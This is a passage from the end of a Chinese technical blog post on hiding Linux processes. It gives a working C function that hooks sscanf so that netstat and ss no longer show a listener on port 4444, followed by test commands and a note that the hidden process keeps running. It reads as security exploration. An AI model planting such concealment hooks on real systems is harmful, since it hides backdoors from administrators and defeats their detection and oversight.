+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdarg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> __isoc99_sscanf(<span class="type">const</span> <span class="type">char</span> *str, <span class="type">const</span> <span class="type">char</span> *format, ...)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> ret;</span><br><span class="line">    va_list ap;</span><br><span class="line">    va_start(ap, format);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">strstr</span>(str, <span class="string">&quot;00000000:115C 00000000:0000 0A&quot;</span>))</span><br><span class="line">        <span class="keyword">return</span> <span class="number">12</span>;</span><br><span class="line"></span><br><span class="line">    ret = vsscanf(str, format, ap);</span><br><span class="line">    va_end(ap);</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>hook后, 就可以用系统自带的<code>netstat</code>来测试了</p>
+<h4 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ss|grep 4444</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsats -antup|grep 4444</span><br></pre></td></tr></table></figure>
+
+<p>这两者的结果都为空</p>
+<p>由于检测不到进程监听4444端口, 甚至可以在此端口重复开进程</p>
+<p>虽然<code>ps</code>和<code>netstat</code>都看不到, 但进程实际上是成功运行了的, 也拥有正常的功能</p>
+<p><img src="/2022/07/19/linux%E4%B8%8B%E8%BF%9B%E7%A8%8B%E9%9A%90%E8%97%8F%E7%9A%84%E4%B8%80%E4%BA%9B%E7%A0%94%E7%A9%B6/res4.jpg"></p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/linux/" rel="tag"># linux</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2022/06/06/arch-linux-diary/" rel="prev" title="arch-linux-diary">
+      <i class="fa fa-chevron-left"></i> arch-linux-diary
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%BF%9B%E7%A8%8B%E9%9A%90%E8%97%8F"><span class="nav-number">1.</span> <span class="nav-text">进程隐藏</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#ps%E8%BF%9B%E7%A8%8B%E9%9A%90%E8%97%8F"><span class="nav-number">1.0.1.</span> <span class="nav-text">ps进程隐藏</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%87%86%E5%A4%87"><span class="nav-number">1.0.1.1.</span> <span class="nav-text">准备</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#ps%E9%80%BB%E8%BE%91%E7%9A%84%E5%88%86%E6%9E%90"><span class="nav-number">1.0.1.2.</span> <span class="nav-text">ps逻辑的分析</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%B0%83%E8%AF%95"><span class="nav-number">1.1.</span> <span class="nav-text">调试</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#hook"><span class="nav-number">1.2.</span> <span class="nav-text">hook</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%B5%8B%E8%AF%95%E6%95%88%E6%9E%9C"><span class="nav-number">1.3.</span> <span class="nav-text">测试效果</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#netstat%E8%BF%9B%E7%A8%8B%E9%9A%90%E8%97%8F"><span class="nav-number">2.</span> <span class="nav-text">netstat进程隐藏</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%87%86%E5%A4%87-1"><span class="nav-number">2.1.</span> <span class="nav-text">准备</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%98%85%E8%AF%BB%E6%BA%90%E7%A0%81%E4%B8%8E%E8%B0%83%E8%AF%95"><span class="nav-number">2.2.</span> <span class="nav-text">阅读源码与调试</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#hook-1"><span class="nav-number">2.2.1.</span> <span class="nav-text">hook</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%B5%8B%E8%AF%95"><span class="nav-number">2.2.2.</span> <span class="nav-text">测试</span></a></li></ol></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">John Doe</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">11</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">8</span>
+        <span class="site-state-item-name">tags</span>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">John Doe</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a>
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
